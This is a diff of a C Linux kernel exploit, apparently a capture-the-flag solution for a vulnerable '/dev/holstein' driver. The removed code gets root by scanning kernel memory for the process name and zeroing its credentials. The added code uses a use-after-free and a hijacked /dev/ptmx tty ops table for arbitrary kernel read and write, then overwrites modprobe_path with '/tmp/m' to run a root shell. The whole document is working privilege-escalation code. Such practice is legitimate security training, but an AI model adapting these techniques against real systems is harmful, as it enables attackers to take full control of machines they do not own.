@@ -62,93 +62,56 @@ void hexdump(void *mem, unsigned int len)
 	}
 }
 
-unsigned long user_cs, user_ss, user_rsp, user_rflags;
 
-static void win() {
-    char *argv[] = { "/bin/sh", NULL };
-    char *envp[] = { NULL };
-
-    execve("/bin/sh", argv, envp);
-}
-
-static void save_state() {
-    asm("movq %%cs, %0\n"
-        "movq %%ss, %1\n"
-        "movq %%rsp, %2\n"
-        "pushfq\n"
-        "popq %3\n"
-        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
-        :
-        : "memory");
-}
 
 #define AAR_GADGET 0xffffffff816ae679 - 0xffffffff81000000
 #define AAW_GADGET 0xffffffff818d9ef8 - 0xffffffff81000000
 
-int fd;
+int fd1, fd2;
 int target_fd;
 char buf[0x500];
 uint64_t kernel_base;
 uint64_t gbuf_addr;
 
 void AAW(uint64_t* dst, unsigned int val){
-	uint64_t* fake_ops = buf;
+	uint64_t* fake_ops = buf + 0x300;
 	fake_ops[12] = kernel_base + AAW_GADGET;
-	*(uint64_t*)(buf + 0x418) = gbuf_addr;
-	write(fd, buf, 0x500);
+	*(uint64_t*)(buf + 0x18) = gbuf_addr + 0x300;
+	write(fd2, buf, 0x400);
 	ioctl(target_fd, val, dst);
 }
 
 unsigned int AAR(uint64_t* src){
-	uint64_t* fake_ops = buf;
+	uint64_t* fake_ops = buf + 0x300;
 	fake_ops[12] = kernel_base + AAR_GADGET;
-	*(uint64_t*)(buf + 0x418) = gbuf_addr;
-	write(fd, buf, 0x500);
+	*(uint64_t*)(buf + 0x18) = gbuf_addr + 0x300;
+	write(fd2, buf, 0x400);
 	return ioctl(target_fd, 0, src);
 }
 
+void win(){
+    system("/dummy");
+    system("/shell");
+}
 
+#define kernel_offset 0x0000000001072460
+#define modprobe  0x0000000001451020
 int main() {
-    save_state();
-	if (prctl(PR_SET_NAME, "KUICS" ) != 0 ) 
-		exit(0);
 
-	fd = open("/dev/holstein", O_RDWR);
+	fd1 = open("/dev/holstein", O_RDWR);
+	fd2 = open("/dev/holstein", O_RDWR);
+	close(fd1);
 	target_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
-	read(fd, buf, 0x500);
-	hexdump(buf, 0x500);
-	uint64_t kernel_text = *(uint64_t*)(buf + 0x418);
-	kernel_base = kernel_text - 0x0000000001072460;
+	read(fd2, buf, 0x400);
+	hexdump(buf,0x400);
+	kernel_base = *(uint64_t*)(buf + 0x18) - kernel_offset;
 	printf("[-] kernel base: %p\n", kernel_base);
-	gbuf_addr = *(uint64_t*)(buf + 0x438) - 0x438;
-	printf("[-] gbuf_addr: %p\n", gbuf_addr);
-	gets();
-	uint64_t comm_addr = 0x0;
-	for(uint64_t addr = gbuf_addr - 0x400000;;addr += 8){
-		if(!(addr&0xffff)){
-			printf("[-] searching: %p\n", addr);
-		}
-		//KUIC...
-		if(AAR(addr) == 0x4349554b){
-			printf("[?] hit: %p\n", addr);
-			comm_addr = addr;
-			break;
-		}
-	}
-
-	uint64_t leak1 = (uint64_t)AAR(comm_addr - 0x10);
-	printf("[-] leak1: %p\n", leak1);
-	uint64_t leak2 = (uint64_t)AAR(comm_addr - 0x10 + 4);
-	printf("[-] leak2: %p\n", leak2);
-	uint64_t cred_addr = (leak2 << 32)|(leak1);
-	printf("[-] cred addr: %p\n", cred_addr);
-
-	for(int i=0; i< 8; i++){
-		AAW(cred_addr+4+i*4, 0x0);
-	}
-	system("/bin/sh");
-	//int target_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
-	//ioctl(target_fd, 0x4141414141414141, 0x4242424242424242);
-
+	gbuf_addr = *(uint64_t*)(buf + 0x38) - (uint64_t)0x38;
+	printf("[-] physmap: %p\n", gbuf_addr);
+	uint64_t modprobe_path = kernel_base + modprobe;
+	printf("[-] modprobe: %p\n", modprobe_path);
+	// /tmp/m '2f746d702f6d'
+	AAW(modprobe_path, 0x00006d2f);
+	win();
     return 0;
 }
